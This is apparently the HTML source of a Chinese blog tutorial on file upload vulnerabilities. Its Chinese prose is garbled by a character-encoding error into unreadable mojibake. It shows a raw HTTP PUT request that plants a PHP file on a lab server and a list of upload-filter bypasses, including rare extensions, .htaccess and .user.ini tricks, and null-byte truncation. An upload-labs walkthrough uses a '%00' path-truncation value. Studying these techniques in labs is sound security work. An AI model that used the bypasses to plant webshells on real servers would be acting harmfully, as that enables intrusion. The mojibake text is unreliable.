src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.06.28.png" style="zoom:45%;"><h2 id="4-4-getshell"><a href="#4-4-getshell" class="headerlink" title="4.4 getshell"></a>4.4 getshell</h2><p>GetShell,é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è·å–Webshellçš„è¿‡ç¨‹å’Œç»“æœã€‚å½“ç„¶ä»»æ„æ–‡ä»¶ä¸Šä¼ æ˜¯GetShellçš„ä¸»è¦æ–¹å¼ï¼Œä½†å¹¶ä¸æ˜¯å”¯ä¸€é€”å¾„ã€‚</p><h1 id="äº”ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸºç¡€åˆ©ç”¨å’Œé˜²å¾¡ç»•è¿‡"><a href="#äº”ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸºç¡€åˆ©ç”¨å’Œé˜²å¾¡ç»•è¿‡" class="headerlink" title="äº”ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸºç¡€åˆ©ç”¨å’Œé˜²å¾¡ç»•è¿‡"></a>äº”ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸºç¡€åˆ©ç”¨å’Œé˜²å¾¡ç»•è¿‡</h1><h2 id="5-1-åˆ©ç”¨æ¡ä»¶"><a href="#5-1-åˆ©ç”¨æ¡ä»¶" class="headerlink" title="5.1 åˆ©ç”¨æ¡ä»¶"></a>5.1 åˆ©ç”¨æ¡ä»¶</h2><ul><li>æœ‰å¯è®¿é—®çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</li></ul><p>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œé¦–å…ˆè¦æœ‰èƒ½ä¸Šä¼ æ–‡ä»¶çš„çš„åœ°æ–¹ï¼Œå³â€”â€”è¦æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚æœ‰ä¸€äº›ç½‘ç«™è™½ç„¶è²Œä¼¼æ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯å…¶å®å­˜åœ¨ä¸Šä¼ ä»£ç çš„ã€‚è™½ç„¶æ²¡æœ‰æ˜ç¡®ä½¿ç”¨ä¸Šä¼ åŠŸèƒ½ ï¼Œä½†ä½¿ç”¨äº†ä¸Šä¼ æœ‰å…³çš„å‡½æ•°ï¼Œè¿™ç§æƒ…å†µéœ€è¦é€šè¿‡ä»£ç å®¡è®¡å»çœ‹ã€‚</p><p>æœ€å¸¸è§çš„å°±æ˜¯ä¸Šä¼ å¤´åƒã€‚</p><ul><li><p>å†™æƒé™+æ‰§è¡Œæƒé™</p></li><li><p>Webå®¹å™¨å¯ä»¥è§£æwebshell</p></li><li><p>èƒ½è®¿é—®å¾—åˆ°ä¸Šä¼ çš„æ–‡ä»¶ï¼šå¦‚æœè®¿é—®ä¸åˆ°ï¼Œåˆ™æ— æ³•å¯¹æ–‡ä»¶è¿›è¡Œæ§åˆ¶ï¼Œä¹Ÿå°±æ²¡æœ‰æ¼æ´çš„è¯´æ³•</p></li><li><p>æ— è§†ä»¥ä¸Šæ¡ä»¶é…ç½®ä¸å½“ï¼šæœ‰PUTæ–¹æ³•ï¼ˆåªè¦æœ‰PUTæ–¹æ³•å¿…æœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰</p></li></ul><h2 id="5-2-åˆ©ç”¨-HTTP-PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶"><a href="#5-2-åˆ©ç”¨-HTTP-PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="5.2 åˆ©ç”¨ HTTP PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶"></a>5.2 åˆ©ç”¨ HTTP PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶</h2><h3 id="5-2-1-Apache-å¦‚ä½•å¼€å¯-PUTæ–¹æ³•"><a href="#5-2-1-Apache-å¦‚ä½•å¼€å¯-PUTæ–¹æ³•" class="headerlink" title="5.2.1 Apache å¦‚ä½•å¼€å¯ PUTæ–¹æ³•"></a>5.2.1 Apache å¦‚ä½•å¼€å¯ PUTæ–¹æ³•</h3><h4 id="1ï¼‰telent-æµ‹è¯•-webæœåŠ¡å™¨å¼€å¯äº†å“ªäº›æ–¹æ³•"><a href="#1ï¼‰telent-æµ‹è¯•-webæœåŠ¡å™¨å¼€å¯äº†å“ªäº›æ–¹æ³•" class="headerlink" title="1ï¼‰telent æµ‹è¯• webæœåŠ¡å™¨å¼€å¯äº†å“ªäº›æ–¹æ³•"></a>1ï¼‰telent æµ‹è¯• webæœåŠ¡å™¨å¼€å¯äº†å“ªäº›æ–¹æ³•</h4><p>â€‹ç”¨OPTIONSæ–¹æ³•æ¢æµ‹ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†å“ªäº›æ–¹æ³•ã€‚</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227135124860.png" alt="image-20241227135124860" style="zoom:100%;"><p>å¯ä»¥çœ‹åˆ°æ”¯æŒçš„æ–¹æ³•æœ‰äº”ä¸ªï¼Œæ²¡æœ‰å¼€å¯PUTæ–¹æ³•ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">telnet <span class="token number">192.168</span>.33.4 <span class="token number">80</span>OPTIONS / HTTP/1.1HOST:192.168.33.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2ï¼‰å¼€å¯PUTæ–¹æ³•"><a href="#2ï¼‰å¼€å¯PUTæ–¹æ³•" class="headerlink" title="2ï¼‰å¼€å¯PUTæ–¹æ³•"></a>2ï¼‰å¼€å¯PUTæ–¹æ³•</h4><ul><li>æ“ä½œé…ç½®æ–‡ä»¶httpd.conf[è®°å¾—å¤‡ä»½]ï¼Œ å¼€å¯davç›¸å…³æ¨¡å—</li></ul><p>ctrl +F davæœç´¢dav</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.49.19.png" style="zoom:75%;"><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.50.17.png" style="zoom:75%;"><p>å–æ¶ˆ102å’Œ103è¡Œçš„æ³¨é‡Šï¼Œå¼€å¯ä¸¤ä¸ªæ¨¡å—ã€‚</p><p>å¯ç”¨æ¨¡å—ï¼š</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.52.03.png" style="zoom:75%;"><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.52.54.png" style="zoom:75%;"><p>æ·»åŠ DAV On</p><ul><li>å¼€å¯æ–‡ä»¶é”ã€è¦åˆ›å»ºdavæ–‡ä»¶å¤¹ã€‘</li></ul><p>DavLockDB C:\phpstudy\WWW\DavLock ã€æ”¾åœ¨httpd.conf çš„ç¬¬ä¸€è¡Œã€‘</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.56.33.png" style="zoom:75%;"><p>åˆ›å»ºC:\phpstudy\WWW\DavLockç›®å½•</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-02%20%E4%B8%8B%E5%8D%888.00.42.png" style="zoom:75%;"><p>é‡å¯æœåŠ¡ã€‚</p><h4 id="3ï¼‰å†æ¬¡ç”¨OPTIONSæ–¹æ³•æµ‹è¯•"><a href="#3ï¼‰å†æ¬¡ç”¨OPTIONSæ–¹æ³•æµ‹è¯•" class="headerlink" title="3ï¼‰å†æ¬¡ç”¨OPTIONSæ–¹æ³•æµ‹è¯•"></a>3ï¼‰å†æ¬¡ç”¨OPTIONSæ–¹æ³•æµ‹è¯•</h4><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.59.19.png" style="zoom:55%;"><p>æ²¡æœ‰PUTæ–¹æ³•ï¼Œä½†ä¹Ÿå¯ä»¥å°è¯•ä¸Šä¼ æ–‡ä»¶å¹¶æˆåŠŸã€‚</p><h3 id="5-2-2-PUTæ–¹æ³•çš„ä¸Šä¼ æ¼æ´"><a href="#5-2-2-PUTæ–¹æ³•çš„ä¸Šä¼ æ¼æ´" class="headerlink" title="5.2.2 PUTæ–¹æ³•çš„ä¸Šä¼ æ¼æ´"></a>5.2.2 PUTæ–¹æ³•çš„ä¸Šä¼ æ¼æ´</h3><h4 id="1ï¼‰åˆ©ç”¨putæ–¹æ³•ä¸Šä¼ webshell"><a href="#1ï¼‰åˆ©ç”¨putæ–¹æ³•ä¸Šä¼ webshell" class="headerlink" title="1ï¼‰åˆ©ç”¨putæ–¹æ³•ä¸Šä¼ webshell"></a>1ï¼‰åˆ©ç”¨putæ–¹æ³•ä¸Šä¼ webshell</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUT /php/infosxk.php HTTP/1.1HOST:192.168.33.4Content-Length:18<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227135916449.png" style="zoom:100%;"><p>âš ï¸ï¼šä¸è¦å¤ªç›¸ä¿¡ctrl c ctrl vï¼Œæœ‰å¯èƒ½ä¼šè¾“å…¥å…¶ä»–çš„å­—ç¬¦ã€‚  </p><p>è®¿é—®æµ‹è¯•ï¼š   </p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-03%20%E4%B8%8A%E5%8D%889.22.15.png" style="zoom:75%;"><h2 id="5-3-é˜²å¾¡ç»•è¿‡å’Œåˆ©ç”¨"><a href="#5-3-é˜²å¾¡ç»•è¿‡å’Œåˆ©ç”¨" class="headerlink" title="5.3 é˜²å¾¡ç»•è¿‡å’Œåˆ©ç”¨"></a>5.3 é˜²å¾¡ç»•è¿‡å’Œåˆ©ç”¨</h2><h3 id="5-3-1-é»‘ç™½åå•ç­–ç•¥"><a href="#5-3-1-é»‘ç™½åå•ç­–ç•¥" class="headerlink" title="5.3.1 é»‘ç™½åå•ç­–ç•¥"></a>5.3.1 é»‘ç™½åå•ç­–ç•¥</h3><p>é»‘ç™½åå•æ˜¯æœ€å¸¸ç”¨çš„å®‰å…¨ç­–ç•¥ä¹‹ä¸€ã€‚åœ¨è®¡ç®—æœºå®‰å…¨ä¸­ï¼Œé»‘ç™½åå•ç±»ä¼¼äºä¸€ä¸ªåˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­å†™äº†ä¸€äº›æ¡ä»¶æˆ–è§„åˆ™ï¼Œå¦‚æœâ€œå®¢ä½“â€åœ¨é»‘åå•ä¸­ï¼Œä¸€å¾‹â€œç¦æ­¢â€ï¼Œå¦‚æœâ€œå®¢ä½“â€åœ¨ç™½åå•ä¸­ï¼Œä¸€å¾‹â€œå…è®¸â€ã€‚ç±»ä¼¼äºæ‰‹æœºå·ç çš„é»‘ç™½åå•ã€‚é…åˆä½¿ç”¨ï¼Œç™½åå•ä¼˜å…ˆçº§æ›´é«˜ã€‚</p><ul><li>ç»•è¿‡æ€è·¯ï¼šæ‰¾é»‘åå•ä¹‹å¤–çš„å¯ä»¥ä¸Šä¼ çš„åç¼€ï¼Œç™½åå•çš„è¯ä¸å¤ªå¥½ç»•è¿‡ã€‚</li><li>ä½†å¦‚æœæ˜¯å‰ç«¯çš„é™åˆ¶ï¼Œåˆ™æ— è®ºæ˜¯é»‘åå•å’Œç™½åå•å¯¹æ”»å‡»è€…æ¥è¯´éƒ½æ˜¯å¤±æ•ˆçš„ï¼Œåªéœ€è¦æŠ“åŒ…æ”¹åŒ…å°±è¡Œäº†ã€‚</li></ul><h3 id="5-3-2-å‰ç«¯é™åˆ¶ä¸ç»•è¿‡"><a href="#5-3-2-å‰ç«¯é™åˆ¶ä¸ç»•è¿‡" class="headerlink" title="5.3.2 å‰ç«¯é™åˆ¶ä¸ç»•è¿‡"></a>5.3.2 å‰ç«¯é™åˆ¶ä¸ç»•è¿‡</h3><p>F1ï¼šå› ä¸ºJSè„šæœ¬çš„è¿è¡Œç¯å¢ƒæ˜¯æµè§ˆå™¨ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹JSä»£ç ï¼Œç”šè‡³åˆ é™¤è¡¨å•äº‹ä»¶ã€‚</p><p>F2ï¼šä½¿æ¶æ„æ–‡ä»¶åç¼€åç¬¦åˆç™½åå•ç­–ç•¥ï¼Œç”¨Burp æŒ‚ä»£ç†æŠ“åŒ…ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶åç¼€åå³å¯ã€‚</p><p>å¯¹äºæ–‡ä»¶ä¸Šä¼ ï¼Œåªä»Webå‰ç«¯è¿›è¡Œæ£€æµ‹æ˜¾ç„¶é˜²æŠ¤ä¸è¶³ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ç«¯æ£€æµ‹å°±ç‰¹åˆ«é‡è¦äº†ã€‚ä¸€èˆ¬æœåŠ¡å™¨ç«¯æ£€æµ‹ï¼Œé‡‡ç”¨é»‘ç™½åå•ç­–ç•¥ã€‚</p><h3 id="5-3-3-æœåŠ¡å™¨ç«¯é™åˆ¶"><a href="#5-3-3-æœåŠ¡å™¨ç«¯é™åˆ¶" class="headerlink" title="5.3.3 æœåŠ¡å™¨ç«¯é™åˆ¶"></a>5.3.3 æœåŠ¡å™¨ç«¯é™åˆ¶</h3><h4 id="1ï¼‰MIMEæ£€æµ‹"><a href="#1ï¼‰MIMEæ£€æµ‹" class="headerlink" title="1ï¼‰MIMEæ£€æµ‹"></a>1ï¼‰MIMEæ£€æµ‹</h4><p>MIME(Multipurpose Internet Mail Extensions)æ˜¯æè¿°æ¶ˆæ¯å†…å®¹ç±»å‹çš„å› ç‰¹ç½‘æ ‡å‡†ã€‚MIMEæ¶ˆæ¯èƒ½åŒ…å«æ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ä»¥åŠå…¶ä»–åº”ç”¨ç¨‹åºä¸“ç”¨çš„æ•°æ®ã€‚å¸¸è§çš„MIMEç±»å‹å¦‚ä¸‹ï¼š</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227142915200.png" style="zoom:100%;"><p>åœ¨HTTPåè®®ä¸­ï¼Œä½¿ç”¨Content-Type å­—æ®µè¡¨ç¤ºæ–‡ä»¶çš„MIMEç±»å‹ã€‚å½“æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼ŒæŠ“åˆ°HTTPæ•°æ®åŒ…ã€‚åœ¨æœåŠ¡å™¨ç«¯ä¼šæ£€æµ‹Content-Typeç±»å‹ã€‚</p><p>âš ï¸ï¼šContent-Type æ˜¯ç”±æµè§ˆå™¨å®šä¹‰çš„ã€‚</p><ul><li>ç»•è¿‡æ–¹æ³•ï¼šåˆ©ç”¨BPï¼Œä¿®æ”¹Content-Typeç±»å‹ç»•è¿‡ï¼ŒæœåŠ¡å™¨å¯¹MIMEç±»å‹çš„æ£€æµ‹ã€‚</li></ul><h4 id="2ï¼‰æ–‡ä»¶å†…å®¹æ£€æµ‹"><a href="#2ï¼‰æ–‡ä»¶å†…å®¹æ£€æµ‹" class="headerlink" title="2ï¼‰æ–‡ä»¶å†…å®¹æ£€æµ‹"></a>2ï¼‰æ–‡ä»¶å†…å®¹æ£€æµ‹</h4><p>é™¤äº†æ£€æµ‹ä¸Šä¼ æ–‡ä»¶çš„Content-Typeç±»å‹ï¼Œä¸ºäº†ä¿æŒå®‰å…¨æ€§ï¼ŒæœåŠ¡å™¨ç«¯è¿˜ä¼šæ£€æµ‹æ–‡ä»¶å†…å®¹ã€‚</p><p>PHPä¸­æœ‰ä¸€ä¸ªå‡½æ•°getimagesize(),è¿™ä¸ªå‡½æ•°æœ¬æ„æ˜¯æ£€æŸ¥å›¾ç‰‡çš„å¤§å°,ä½†æ˜¯åœ¨æ£€æŸ¥ä¹‹å‰ï¼Œè¯¥å‡½æ•°ä¼šåˆ¤æ–­ç›®æ ‡æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚ å› æ­¤ï¼Œå¯ä»¥ç”¨è¯¥å‡½æ•°æ¥æ£€æµ‹æ–‡ä»¶çš„å†…å®¹ã€‚ã€upload-load 14å…³ã€‚ã€‘</p><ul><li>å›¾ç‰‡æœ¨é©¬ç»•è¿‡å†…å®¹æ£€æµ‹ï¼ˆå›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œï¼‰ã€å…·ä½“æ–¹æ³•è§<code>å›¾ç‰‡æœ¨é©¬åˆ¶ä½œ</code>ä¸€æ–‡ã€‚ã€‘</li></ul><h4 id="3ï¼‰åç¼€åæ£€æµ‹"><a href="#3ï¼‰åç¼€åæ£€æµ‹" class="headerlink" title="3ï¼‰åç¼€åæ£€æµ‹"></a>3ï¼‰åç¼€åæ£€æµ‹</h4><ul><li>é»‘åå•</li></ul><p>å¯»æ‰¾å…¶ä»–æœªè¢«ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹åšå°è¯•ï¼š</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227144344869.png" style="zoom:98%;"><ul><li>ç™½åå•</li></ul><p>åªèƒ½ä¸Šä¼ ç™½åå•æ ¼å¼çš„æ–‡ä»¶ã€‚</p><p>åˆ©ç”¨æ¼æ´éœ€è¦ç»“åˆå…¶ä»–æ¼æ´ï¼ˆæ–‡ä»¶è§£ææ¼æ´ç­‰ï¼‰ã€‚</p><h3 id="ç»•è¿‡æ–¹æ³•æ€»ç»“"><a href="#ç»•è¿‡æ–¹æ³•æ€»ç»“" class="headerlink" title="ç»•è¿‡æ–¹æ³•æ€»ç»“"></a>ç»•è¿‡æ–¹æ³•æ€»ç»“</h3><ul><li><p>å†·é—¨åç¼€ ï¼ˆphp2ã€php3ã€php4ã€php5ã€phtmlã€phtâ€¦ï¼‰</p></li><li><p>å¤§å°å†™ç»•è¿‡</p></li><li><p>åŒå†™ç»•è¿‡</p></li><li><p>æ”¹.htaccessè§£æ </p></li><li><p>GET/postå‹00æˆªæ–­ </p></li><li><p>Webå®¹å™¨è§£ææ¼æ´</p></li><li><p>æ”¹.user.iniè‡ªåŠ¨åŒ…å«</p></li><li><p>Windowsç‰¹æ€§ ç©ºæ ¼</p></li><li><p>Windowsç‰¹æ€§ ç‚¹. </p></li><li><p>æ¡ä»¶ç«äº‰</p></li></ul><h1 id="å…­ã€-00æˆªæ–­"><a href="#å…­ã€-00æˆªæ–­" class="headerlink" title="å…­ã€ 00æˆªæ–­"></a>å…­ã€ 00æˆªæ–­</h1><p>00å°±æ˜¯Null (ç©º)å­—ç¬¦ï¼ŒURLä¸­è¡¨ç°ä¸º%00ï¼Œ00æˆªæ–­ä¼šå¯¼è‡´æ–‡ä»¶ä¸Šä¼ è·¯å¾„æˆªæ–­ã€‚</p><p>ã€æˆ‘ä»¬ä»¥upload-labsç¬¬12å…³ä¸ºä¾‹å­è¯´æ˜è¿™ä¸ªé—®é¢˜ã€‚ã€‘</p><p>åŸç†åˆ†æï¼šphp move_upload_file()å‡½æ•°çš„å®ç°åŸºäºCè¯­è¨€ï¼ŒCè¯­è¨€ä¸­ï¼Œå­—ç¬¦ä¸²çš„ç»“å°¾ä¸º\0,nullã€‚è§åˆ°nullï¼ŒCè¯­è¨€ä¼šè®¤ä¸ºè¯¥å­—ç¬¦ä¸²å·²ç»ç»“æŸã€‚åˆ©ç”¨ä¸Šè¿°ç‰¹ç‚¹ï¼Œå¯ä»¥æˆªæ–­ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ï¼Œå°†æ–‡ä»¶å¦å­˜ä¸ºæˆ‘ä»¬æƒ³è¦çš„ç›®æ ‡æ–‡ä»¶ï¼Œæ¯”å¦‚webshellç­‰ã€‚</p><h2 id="6-1-upload-labs-12å…³ï¼ˆEXï¼‰"><a href="#6-1-upload-labs-12å…³ï¼ˆEXï¼‰" class="headerlink" title="6.1 upload-labs 12å…³ï¼ˆEXï¼‰"></a>6.1 upload-labs 12å…³ï¼ˆEXï¼‰</h2><p>1ã€ä¸Šä¼ phpinfo.php BPæŠ“åŒ…æµ‹è¯•ï¼ˆç›´æ¥è·³è¿‡æœ¬åœ°é™åˆ¶è¿™ä¸€ç¯ï¼Œæœ¬åœ°é™åˆ¶çš„ç»•è¿‡è¿‡äºç®€å•ï¼‰</p><p>   ä¸Šä¼ å¤±è´¥ï¼š     æç¤ºï¼šåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼ </p><p>2ã€BPæŠ“åŒ…æ”¹åç¼€åä¸ºåˆæ³•åç¼€åã€‚</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%883.47.40.png" style="zoom:75%;"><p>â€‹     src=â€../upload//5820210705074748.jpg</p><p>â€‹    ä¸Šä¼ æˆåŠŸï¼Œè¿›è¡Œäº†å¦å­˜å’Œé‡å‘½åã€‚</p><p>â€‹     æ³¨æ„åˆ° Content-Typeä¸ºphpä¹Ÿè¿‡å»äº†ï¼Œè¯´æ˜æœåŠ¡å™¨æ²¡æœ‰å¯¹MIMEç±»å‹åšæ£€æµ‹ã€‚</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%883.50.22.png" style="zoom:75%;"><p>â€‹     æ³¨æ„åˆ°å†…å®¹ä¸ºphpè„šæœ¬ï¼Œä¹Ÿè¿‡å»äº†ï¼Œè¯´æ˜æœåŠ¡å™¨æ²¡æœ‰å¯¹å†…å®¹è¿›è¡Œæ£€æµ‹ã€‚</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%883.51.05.png" style="zoom:75%;"><p>â€‹     ç»¼ä¸Šï¼ŒæœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€ååšäº†é™åˆ¶å¹¶è¿›è¡Œäº†å¦å­˜é‡å‘½åæ“ä½œã€‚</p><p>3ã€00æˆªæ–­</p><p>â€‹      URLä¸­é»˜è®¤ä¼ é€’äº†save_pathå˜é‡ï¼ŒæŒ‡æ˜è¦ä¿å­˜çš„è·¯å¾„ã€‚</p><p>â€‹     /upload-labs-master/Pass-12/index.php?save_path=../upload/</p><p>â€‹    ä¸Šä¼ çš„æ–‡ä»¶è¢«ä¿å­˜åœ¨ï¼Œ/upload/ç›®å½•ä¸‹ã€‚</p><p>â€‹    save_path=../upload/sxk.php æç¤ºä¸Šä¼ å‡ºé”™ã€‚</p><p>â€‹    æ ¹æ®00æˆªæ–­çš„åŸç†ï¼Œå®ç°æ–‡ä»¶çš„å¦å­˜ã€‚ </p><p>â€‹    save_path=../upload/sxk.php%00</p><p>â€‹    è¿˜æ˜¯ä¸Šä¼ å‡ºé”™ã€‚ </p><p>â€‹    PHPç‰ˆæœ¬ ï¼Œæ¨è5.2.17   ï¼Œå…¶ä»–ç‰ˆæœ¬å¯èƒ½ä¼šå¯¼è‡´éƒ¨åˆ†Passæ— æ³•çªç ´ã€‚</p><p>â€‹    åº”è¯¥æ˜¯PHPç‰ˆæœ¬çš„é—®é¢˜ï¼Œæ€è·¯æ²¡é—®é¢˜ï¼Œphpstudyæ¢æˆ5.2.17ç‰ˆæœ¬çš„è¿˜æ˜¯æˆªæ–­ä¸æˆåŠŸã€‚</p><p>ã€è§5.4.2ï¼Œè·¯å¾„00æˆªæ–­+æ–‡ä»¶åç»•è¿‡åç¼€æ£€æµ‹ã€‚ã€‘</p><h2 id="6-2-PHP-00æˆªæ–­"><a href="#6-2-PHP-00æˆªæ–­" class="headerlink" title="6.2 PHP 00æˆªæ–­"></a>6.2 PHP 00æˆªæ–­</h2><h3 id="1ï¼‰ç”¨åœ¨å“ªé‡Œ"><a href="#1ï¼‰ç”¨åœ¨å“ªé‡Œ" class="headerlink" title="1ï¼‰ç”¨åœ¨å“ªé‡Œ"></a>1ï¼‰ç”¨åœ¨å“ªé‡Œ</h3><p>â€‹é™¤äº†phpé…ç½®çš„é‚£ä¸ªè§£ææ¼æ´ä¹‹å¤–ï¼Œæ­£ç»ä½¿ç”¨%00æˆªæ–­ç»•è¿‡åº”è¯¥æ˜¯æ”¾åœ¨ä¸Šä¼ æ–‡ä»¶è·¯å¾„åï¼Œè€Œéæ–‡ä»¶åå¤„ã€‚</p><h3 id="2ï¼‰åŸç†"><a href="#2ï¼‰åŸç†" class="headerlink" title="2ï¼‰åŸç†"></a>2ï¼‰åŸç†</h3><p>0x00æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸæ ‡è¯†ç¬¦ï¼Œæ”»å‡»è€…é€šè¿‡æ‰‹åŠ¨æ·»åŠ å­—ç¬¦ä¸²ç»“æŸæ ‡è¯†ç¬¦çš„æ–¹å¼ï¼Œå°†00åé¢å†…å®¹æˆªæ–­ã€‚ä½†æ˜¯00åé¢çš„ä¸œè¥¿åˆèƒ½å¸®åŠ©æˆ‘ä»¬ç»•è¿‡æ–‡ä»¶æ£€æµ‹ã€‚</p><h3 id="3ï¼‰æ¡ä»¶"><a href="#3ï¼‰æ¡ä»¶" class="headerlink" title="3ï¼‰æ¡ä»¶"></a>3ï¼‰æ¡ä»¶</h3><p>è¦æ±‚GPCå¤„äºå…³é—­çŠ¶æ€ï¼Œä¸”phpç‰ˆæœ¬å°äº5.3.29æ‰å¯åˆ©ç”¨ã€‚</p><h3 id="4ï¼‰ä½¿ç”¨"><a href="#4ï¼‰ä½¿ç”¨" class="headerlink" title="4ï¼‰ä½¿ç”¨"></a>4ï¼‰ä½¿ç”¨</h3><ul><li>ä¸ºä»€ä¹ˆ00æˆªæ–­ç”¨åœ¨ä¸Šä¼ åæ–‡ä»¶ç›®å½•?</li></ul><p>åœ¨æ–‡ä»¶åä¸­æ„é€ 00æˆªæ–­ï¼Œæ¯”å¦‚1.php%001.jpgã€‚åœ¨ç¨‹åºæå–åç¼€åçš„æ—¶å€™ï¼Œé‡åˆ°%00å°±è®¤ä¸ºç»“æŸäº†ã€‚è¿™ä¸ªæ—¶å€™ï¼Œä»–æå–åˆ°çš„åç¼€åè¿˜æ˜¯.phpï¼Œç„¶å.phpè¢«é™åˆ¶ä¸Šä¼ ï¼Œæ‰€ä»¥ç»•è¿‡å¤±è´¥ã€‚</p><p>æ–‡ä»¶åæ£€æµ‹ä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'file'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æå–ä¸Šä¼ æ–‡ä»¶åç¼€</span><span class="token variable">$target_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$uploaded_name</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span> <span class="token comment">// å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œé‡å‘½å</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpeg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 